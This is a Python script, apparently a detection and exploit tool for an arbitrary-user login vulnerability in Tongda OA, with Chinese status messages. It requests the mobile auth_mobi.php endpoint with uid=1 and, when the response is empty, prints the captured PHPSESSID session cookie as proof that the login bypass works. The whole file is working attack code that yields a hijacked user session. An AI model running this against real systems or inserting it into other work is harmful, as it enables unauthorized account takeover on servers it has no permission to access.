import re
import time

import requests


def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    vuln_url = target_url + "/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0"
    print(now_time() + " [INFO]     正在检测通达OA在线任意用户的登录漏洞")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=30)
        page = response.text
        if "RELOGIN" in page and response.status_code == 200:
            print(
                now_time() + "  [WARNING]  通达OA_A任意用户的登录漏洞不存在")
        elif response.status_code == 200 and page == "":
            PHPSESSION = re.findall(r'PHPSESSID=(.*?);', str(response.headers))
            print(
                now_time() + " [SUCCESS]  目标存在通达OA任意用户的登录漏洞,session为: {}".format(PHPSESSION))
        else:
            print(now_time() + " [WARNING]  通达OA任意用户的登录漏洞不存在")
    except:
        print(now_time() + " [ERROR]    目标请求失败 ")
